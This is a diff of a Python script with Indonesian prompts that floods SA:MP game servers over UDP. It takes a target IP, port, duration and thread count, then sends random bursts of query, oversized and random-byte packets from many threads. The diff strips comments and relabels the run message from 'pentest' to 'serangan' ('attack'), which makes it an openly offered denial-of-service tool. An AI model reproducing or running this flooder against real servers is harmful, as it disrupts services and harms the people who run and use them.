@@ -4,10 +4,10 @@ import random
 import time
 import os
 
-TARGET_IP = input("Masukkan IP server target: ")
-PORT = int(input("Masukkan port server target: "))
-DURATION = int(input("Durasi pentest (detik): "))
-THREADS = int(input("Jumlah threads (misal 500-2000): "))
+TARGET_IP = input("Masukkan IP: ")
+PORT = int(input("Masukkan port: "))
+DURATION = int(input("Durasi: "))
+THREADS = int(input("Jumlah threads: "))
 
 SAMP_FLAGS = [b'i', b'r', b'd', b'c', b'x']
 
@@ -21,7 +21,7 @@ def flood():
     timeout = time.time() + DURATION
     while time.time() < timeout:
         try:
-            batch_size = random.randint(10, 30)  # burst packet per loop
+            batch_size = random.randint(10, 30)
             for _ in range(batch_size):
                 mode = random.choice(['query', 'oversize', 'spam'])
                 if mode == 'query':
@@ -31,10 +31,10 @@ def flood():
                 else:
                     payload = os.urandom(random.randint(64, 256))
                 sock.sendto(payload, (TARGET_IP, PORT))
-            time.sleep(random.uniform(0, 0.01))  # delay sangat kecil
+            time.sleep(random.uniform(0, 0.01))
         except:
             pass
 
-print(f"[!] Mulai pentest UDP SA:MP ke {TARGET_IP}:{PORT} selama {DURATION} detik dengan {THREADS} threads")
+print(f"[!] Mulai serangan UDP SA:MP ke {TARGET_IP}:{PORT} selama {DURATION} detik dengan {THREADS} threads")
 for _ in range(THREADS):
     threading.Thread(target=flood).start()
